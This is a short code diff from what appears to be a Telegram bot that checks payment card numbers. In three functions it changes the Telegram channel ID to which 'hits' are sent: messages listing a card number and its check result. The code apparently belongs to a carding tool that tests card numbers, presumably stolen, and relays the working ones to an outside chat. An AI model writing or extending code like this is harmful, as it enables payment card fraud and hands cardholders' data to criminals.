@@ -71,7 +71,7 @@ async def plan_expirychk(user_id):
 async def send_mtc(resp):
   try:
     from pyrogram import Client, filters
-    hits_id = "-1001802990747"
+    hits_id = "-1002029972014"
     await Client.send_message(hits_id,resp)
   except Exception as e:
       print(e)
@@ -79,7 +79,7 @@ async def send_mtc(resp):
 async def hits_au(cc,result):
   try:
     from pyrogram import Client, filters
-    hits_id = "-1001802990747"
+    hits_id = "-1002029972014"
     resp = f"""<b>
   ⊗ Card - <code>{cc}</code>
   ⊗ Response - {result}
@@ -92,7 +92,7 @@ async def hits_au(cc,result):
 async def hits_chk(cc,result,pi):
   try:
     from pyrogram import Client, filters
-    hits_id = "-1001802990747"
+    hits_id = "-1002029972014"
     resp = f"""<b>
   ⊗ Card - <code>{cc}</code>
   ⊗ Response - {result}
